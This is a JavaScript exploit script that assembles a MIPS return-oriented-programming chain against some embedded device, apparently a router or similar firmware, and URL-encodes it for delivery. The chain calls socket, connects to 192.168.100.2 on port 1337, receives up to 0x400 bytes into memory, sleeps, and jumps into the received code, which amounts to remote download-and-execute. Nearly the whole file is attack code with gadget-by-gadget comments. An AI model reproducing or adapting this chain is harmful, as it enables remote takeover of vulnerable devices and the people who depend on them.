function buf2hex(buffer) { // buffer is an ArrayBuffer
    return Array.prototype.map.call(new Uint8Array(buffer), x => ('00' + x.toString(16)).slice(-2)).join('');
}

function insert_at(arr, index, toInsert) {
    for(var i = 0; i < toInsert.length; i++) {
        arr[i+index]= toInsert[i];
    }
}

function p(hex_addr) {
    var byteArray = [0, 0, 0, 0];
    var i = 3;
    while(i >= 0) {
        var byte = hex_addr & 0xff;
        byteArray[i] = byte;
        hex_addr = (hex_addr - byte) / 256 ;
        i--;
    }
    return byteArray;
}

function build_payload() {

    var hardcoded_afinet = 0x80010368; // holds 00021580
    var socket_addr = 0x80d95970;
    var connect_addr = 0x80d95d5c;
    var recv_addr = 0x80d9642c;
    var sleep_addr = 0x80d92ccc;

    var sockfd_addr = 0x8648d984;
    var sockaddr_addr = 0x864e1568;
    var payload_buffer_addr = sockaddr_addr + 0x08;
    var payload_buffer_addr = 0x8147dbc8;
    var payload_buffer_addr = 0x864df1e8;

    var arr = [].concat(...Array.from({ length: 0x128 }, () => [0x86, 0xcf, 0xb8, 0x84]));

    var first_sp = 0x00;
    var previous_sp = first_sp;

    insert_at(arr, first_sp + 0xf4 - 4, p(0x41414141)); // $fp
    insert_at(arr, first_sp + 0xf4 - 8, p(0x42424242)); // $s7
    insert_at(arr, first_sp + 0xf4 - 12, p(0x43434343)); // $s6
    insert_at(arr, first_sp + 0xf4 - 16, p(0x44444444)); // $s5
    insert_at(arr, first_sp + 0xf4 - 20, p(0x45454545)); // $s4
    insert_at(arr, first_sp + 0xf4 - 24, p(0x46464646)); // $s3
    insert_at(arr, first_sp + 0xf4 - 28, p(0x47474747)); // $s2
    insert_at(arr, first_sp + 0xf4 - 32, p(0x48484848)); // $s1
    insert_at(arr, first_sp + 0xf4 - 36, p(0x49494949)); // $s0


    /**
    SOCKET(2, 1, 0)
    */

    insert_at(arr, previous_sp + 0xf4, p(0x8025c5dc));
    // 0x8025c5dc: addiu $a0, $zero, 2; lw $ra, ($sp); jr $ra; addiu $sp, $sp, 0x10;

    sp = previous_sp + 0x100;
    previous_sp = sp;
    sp = previous_sp + 0x10;
    insert_at(arr, previous_sp, p(0x801607ac));
    // 0x801607ac: addiu $a1, $zero, 1; lw $ra, ($sp); jr $ra; addiu $sp, $sp, 0x10;

    previous_sp = sp;
    sp = previous_sp + 0x10;
    insert_at(arr, previous_sp, p(0x801ba8b8));
    // 0x801ba8b8: move $a2, $zero; lw $ra, ($sp); jr $ra; addiu $sp, $sp, 0x10;

    previous_sp = sp;
    sp = previous_sp + 0x10;
    insert_at(arr, first_sp + 0xf4 - 32, p(socket_addr)); // $s1;
    insert_at(arr, previous_sp, p(0x80e1e190));
    //0x80e1e190: move $v0, $s1; lw $ra, 8($sp); lw $s1, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 0x10;

    previous_sp = sp;
    sp = previous_sp + 0x10;
    insert_at(arr, previous_sp + 0x08, p(0x801602e4));
    // 0x801602e4: jalr $v0; nop; lw $ra, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 0x10;
    // call $v0 - socket(domain, type, protocol) / socket($a0, $a1, $a2) / socket(2, 1, 0)

    // NOTE: at this point $v0 holds our file descriptor (an integer) and we need
    // to save it somewhere in memory otherwise the trick of "the reverse shell will
    // use the same channel when loading" will not work.
    //

    /**
CONNECT(SOCKFD, SOCKADDR, SOCKLEN)
*/

    previous_sp = sp;
    sp = previous_sp + 0x10;
    // FIRST, we need to control $s0 again
    insert_at(arr, previous_sp + 0x04, p(0x8001ef64));
    // 0x8001ef64: lw $ra, 0x14($sp); lw $s0, 0x10($sp); jr $ra; addiu $sp, $sp, 0x20;

    previous_sp = sp;
    sp = previous_sp + 0x20;
    insert_at(arr, previous_sp + 0x10, p(sockfd_addr - 0x04)); // sockfd is at 0x8648d984;
    insert_at(arr, previous_sp + 0x14, p(0x80062840));
    // 0x80062840: sw $v0, 4($s0); lw $ra, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 0x10;

    previous_sp = sp;
    sp = previous_sp + 0x10;
    insert_at(arr, previous_sp + 0x04, p(0x80cfee24));
    //insert_at(arr, previous_sp + 0x04, p(0x51515151))
    // 0x80cfee24: move $a0, $v0; lw $ra, ($sp); jr $ra; addiu $sp, $sp, 0x10;
    // $a0 now contains the return value ($v0) from calling 'socket'

    // we put 0x20202020 in $a2
    previous_sp = sp;
    sp = previous_sp + 0x10;
    insert_at(arr, previous_sp, p(0x80d51538));
    insert_at(arr, sp, p(0x20202020));
    insert_at(arr, sp + 0x10, p(hardcoded_afinet));
    insert_at(arr, sp+0x14, p(sockaddr_addr)); // buffer address
    // 0x80d51538: lw $a2, ($sp); lw $ra, 0x18($sp); lw $s1, 0x14($sp); lw $s0, 0x10($sp); jr $ra; addiu $sp, $sp, 0x20;


    // here we have a problem because AF_INET must be equal to \x00\x02, which
    // means holding a null byte. so we need to do some manipulation first
    //
    // we put in $v0 a hardcoded value '00021580' from the code
    previous_sp = sp;
    sp = previous_sp + 0x20;
    insert_at(arr, previous_sp+0x18, p(0x807ebaac));
    // 0x807ebaac: lw $v0, ($s0); lw $ra, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 0x10;

    previous_sp = sp;
    sp = previous_sp + 0x10;
    insert_at(arr, previous_sp + 0x04, p(0x80d00ba8));
    insert_at(arr, sp+0x04, p(sockaddr_addr + 0x04)); // sockaddr_addr + offset to put IP
    // 0x80d00ba8: sw $v0, ($s1); lw $ra, 8($sp); lw $s1, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 0x10;

    previous_sp = sp;
    sp = previous_sp + 0x10;
    insert_at(arr, previous_sp + 0x08, p(0x801b9d50));
    insert_at(arr, sp, [0xc0, 0xa8, 0x64, 0x02]); //struct.pack('>BBBB', 192, 168, 100, 2));
    // 0x801b9d50: lw $v0, ($sp); lw $ra, 0x10($sp); jr $ra; addiu $sp, $sp, 0x20;

    previous_sp = sp;
    sp = previous_sp + 0x20;
    insert_at(arr, previous_sp + 0x10, p(0x80d00ba8));
    insert_at(arr, sp + 0x04, p(sockaddr_addr)); //$s1
    insert_at(arr, sp, p(sockaddr_addr)); // $s0
    // 0x80d00ba8: sw $v0, ($s1); lw $ra, 8($sp); lw $s1, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 0x10;

    previous_sp = sp;
    sp = previous_sp + 0x10;
    insert_at(arr, previous_sp + 0x08, p(0x8002a95c));
    // 0x8002a95c: move $a1, $s0; lw $ra, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 0x10;

    previous_sp = sp;
    sp = previous_sp + 0x10;
    insert_at(arr, sp + 0x04, p(connect_addr));
    insert_at(arr, previous_sp + 0x04, p(0x8072c250));
    // 0x8072c250: lw $v0, 4($sp); lw $ra, 0x10($sp); jr $ra; addiu $sp, $sp, 0x20;

    previous_sp = sp;
    sp = previous_sp + 0x20;
    //insert_at(arr, previous_sp + 0x10, p(0x56565656))
    insert_at(arr, previous_sp + 0x10, p(0x801602e4));
    // 0x801602e4: jalr $v0; nop; lw $ra, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 0x10;
    // call connect(int sockfd, sockaddr addr, socklen_t, addrlen)
    // // $a0 = socketAddr
    // $a1 = $sp = 0x42020539 194 168 22 11
    // sin_family = 0x4202 = AF_INET(2)
    // sin_port = 0x0539 = 1337
    // $a2 = 0x20202020
    //

    // NOTE: at this point we expect $a0 to still hold sockaddr

    /**
RECV(SOCKFD, )
*/

    previous_sp = sp;
    sp = previous_sp + 0x10;
    insert_at(arr, sp  + 0x04, p(payload_buffer_addr));
    insert_at(arr, previous_sp + 0x04, p(0x80c64204));
    // 0x80c64204: lw $a1, 4($sp); lw $ra, 0x10($sp); jr $ra; addiu $sp, $sp, 0x20;

    previous_sp = sp;
    sp = previous_sp + 0x20;
    insert_at(arr, previous_sp + 0x10, p(0x80a0da78));
    // 0x80a0da78: addiu $a2, $zero, 0x400; lw $ra, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 0x10;

    previous_sp = sp;
    sp = previous_sp + 0x10;
    insert_at(arr, previous_sp + 0x04, p(0x8001f198));
    // 0x8001f198: move $a3, $zero; lw $ra, ($sp); jr $ra; addiu $sp, $sp, 0x10;

    // here we need to reload the sockfd value
    previous_sp = sp;
    sp = previous_sp + 0x10;
    insert_at(arr, sp, p(sockfd_addr));
    insert_at(arr, previous_sp, p(0x80525698));
    // 0x80525698: lw $ra, 8($sp); lw $s1, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 0x10;

    previous_sp = sp;
    sp = previous_sp + 0x10;
    insert_at(arr, previous_sp + 0x08, p(0x80428bb4));
    // 0x80428bb4: lw $a0, ($s0); lw $ra, 8($sp); lw $s1, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 0x10;

    previous_sp = sp;
    sp = previous_sp + 0x10;
    insert_at(arr, sp + 0x04, p(recv_addr));
    insert_at(arr, previous_sp + 0x08, p(0x8072c250));
    // 0x8072c250: lw $v0, 4($sp); lw $ra, 0x10($sp); jr $ra; addiu $sp, $sp, 0x20;

    previous_sp = sp;
    sp = previous_sp + 0x20;
    insert_at(arr, previous_sp + 0x10, p(0x801602e4));
    // 0x801602e4: jalr $v0; nop; lw $ra, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 0x10;
    // call recv(int sockfd, void buf, size_t len, iunt flags);
    // call recv($a0, $a1, $a2, $a3)

    previous_sp = sp;
    sp = previous_sp + 0x10;
    insert_at(arr, previous_sp + 0x04, p(0x8025c5dc));
    // 0x8025c5dc: addiu $a0, $zero, 2; lw $ra, ($sp); jr $ra; addiu $sp, $sp, 0x10;

    previous_sp = sp;
    sp = previous_sp + 0x10;
    insert_at(arr, sp + 0x04, p(sleep_addr));
    insert_at(arr, previous_sp, p(0x8072c250));
    // 0x8072c250: lw $v0, 4($sp); lw $ra, 0x10($sp); jr $ra; addiu $sp, $sp, 0x20;

    previous_sp = sp;
    sp = previous_sp + 0x20;
    insert_at(arr, previous_sp + 0x10, p(0x801602e4));
    // 0x801602e4: jalr $v0; nop; lw $ra, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 0x10;

    previous_sp = sp;
    sp = previous_sp + 0x10;
    insert_at(arr, sp + 0x04, p(payload_buffer_addr));
    insert_at(arr, previous_sp + 0x04, p(0x8072c250));
    // 0x8072c250: lw $v0, 4($sp); lw $ra, 0x10($sp); jr $ra; addiu $sp, $sp, 0x20;

    previous_sp = sp;
    sp = previous_sp + 0x20;
    insert_at(arr, previous_sp + 0x10, p(0x801602e4));
    // 0x801602e4: jalr $v0; nop; lw $ra, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 0x10;

    previous_sp = sp;
    sp = previous_sp + 0x10;
    insert_at(arr, previous_sp + 0x04, p(payload_buffer_addr));
    insert_at(arr, previous_sp, p(payload_buffer_addr));
    // --- At this point, we're executing the received payload from the remote server
    //
    return arr.map(x => "%"+ x.toString(16).toUpperCase().padStart(2, "0")).join("");
}
